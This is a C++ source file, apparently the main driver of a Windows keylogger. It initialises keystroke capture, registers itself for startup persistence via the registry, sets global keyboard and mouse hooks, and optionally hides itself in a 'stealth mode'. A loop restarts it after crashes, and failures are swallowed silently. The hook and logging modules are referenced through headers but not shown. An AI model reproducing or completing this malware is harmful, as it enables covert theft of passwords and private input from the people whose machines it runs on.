#include "keyboard.h"
#include "registry.h"
#include "keylogger.h"
#include "utils.h"
#include "mouse.h"
#include "configuration.h"
#include <Windows.h>
#include <thread>
#include <chrono>
#include <iostream>
#include <stdexcept>

// Basic error handling for recovery
void run_keylogger() {
    try {
            
        if (!keylogger::initialize()) {
            throw std::runtime_error("Failed to initialize keylogger");
        }
        
        registry::add_to_startup();
        
        keyboard::set_hook();
        
        mouse::set_hook();
        
        if (configuration::start_in_stealth_mode) {
            utils::make_stealth();
        }
        
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0));
        
        keylogger::cleanup();
    }
    catch (const std::exception& ex) {
        // Log error if possible 
        try {
            std::wofstream error_log(L"error.log", std::ios::app);
            if (error_log.is_open()) {
                std::time_t t = std::time(nullptr);
                std::tm tm;
                localtime_s(&tm, &t);
                error_log << "[" << std::put_time(&tm, "%Y-%m-%d %H:%M:%S") << "] ";
                
                // Convert exception message to wstring
                std::string message = ex.what();
                std::wstring wmessage(message.begin(), message.end());
                error_log << wmessage << std::endl;
                error_log.close();
            }
        }
        catch (...) {
            // Silent failure
        }
    }
    catch (...) {
        // Handle any other exceptions silently
    }
}

int main()
{
    if (configuration::enable_crash_recovery) {
        while (true) {
            run_keylogger();
            std::this_thread::sleep_for(std::chrono::milliseconds(configuration::restart_delay_ms));
        }
    } 
    else {
        run_keylogger();
    }
    
    return 0;
}
